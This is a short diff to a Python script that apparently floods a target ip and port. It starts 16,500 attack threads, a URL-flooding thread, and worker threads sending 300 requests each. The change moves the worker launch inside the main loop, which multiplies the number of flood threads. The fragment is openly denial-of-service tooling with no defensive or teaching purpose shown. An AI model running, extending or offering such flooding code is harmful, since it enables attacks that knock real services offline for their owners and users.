@@ -145,12 +145,11 @@ def worker(requests_per_worker):
 default_threads = 16500
 for i in range(default_threads):
     threading.Thread(target=attack, args=(ip, port, i)).start()
+    threading.Thread(target=workers, args=(num_workers, requests_per_worker)).start()
 threading.Thread(target=flood_url).start()
 
 num_workers = 800
 requests_per_worker = 300
-
-threading.Thread(target=workers, args=(num_workers, requests_per_worker)).start()
 
 # NOTE
 """
